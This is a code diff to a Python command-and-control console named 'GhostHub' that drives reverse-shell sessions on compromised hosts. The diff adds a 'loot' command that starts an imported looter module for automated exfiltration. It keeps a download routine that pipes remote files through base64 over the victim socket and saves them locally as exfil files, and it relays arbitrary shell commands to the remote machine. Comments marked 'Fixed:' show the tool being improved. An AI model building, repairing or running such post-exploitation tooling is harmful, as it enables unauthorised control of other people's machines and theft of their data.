@@ -3,6 +3,7 @@ import threading
 from rich.console import Console
 from rich.table import Table
 from core.ui import draw_header
+from modules.looter import run_looter  # Fixed: Imported the looter module
 
 console = Console()
 
@@ -13,22 +14,30 @@ class GhostHub:
         self.counter = 1
 
     def interact(self, s_id):
+        """Fixed: Added 'loot' command to trigger automated exfiltration."""
         sock = self.sessions[s_id]['sock']
         console.print(
-            f"[bold red][!] Shell Interactive. Type 'download <path>' or 'back'.[/bold red]")
+            f"[bold red][!] Shell Interactive. Type 'loot', 'download <path>' or 'back'.[/bold red]")
+        
         while True:
             cmd = console.input(f"Ghost-{s_id}> ").strip()
             if cmd == "back":
                 break
 
-            if cmd.startswith("download "):
-                # Elite Exfiltration logic
+            if cmd == "loot":
+                # Fixed: Call the integrated Looter engine
+                results = run_looter(sock)
+                console.print(f"\n[bold green][+] Looter Report:[/bold green]")
+                console.print(results)
+            
+            elif cmd.startswith("download "):
                 path = cmd.split(" ", 1)[1]
                 sock.send(f"cat {path} | base64\n".encode())
                 data = sock.recv(1000000).decode()
                 with open(f"exfil_{s_id}_{path.split('/')[-1]}", "w") as f:
                     f.write(data)
                 console.print("[green][+] Encrypted file exfiltrated.[/green]")
+            
             else:
                 sock.send((cmd + "\n").encode())
                 console.print(sock.recv(8192).decode())
@@ -64,6 +73,9 @@ def run_ghost_hub():
         if not cmd:
             continue
         if cmd[0] == "interact":
-            hub.interact(int(cmd[1]))
+            try:
+                hub.interact(int(cmd[1]))
+            except (ValueError, IndexError):
+                console.print("[red][!] Usage: interact <ID>[/red]")
         elif cmd[0] == "exit":
             break
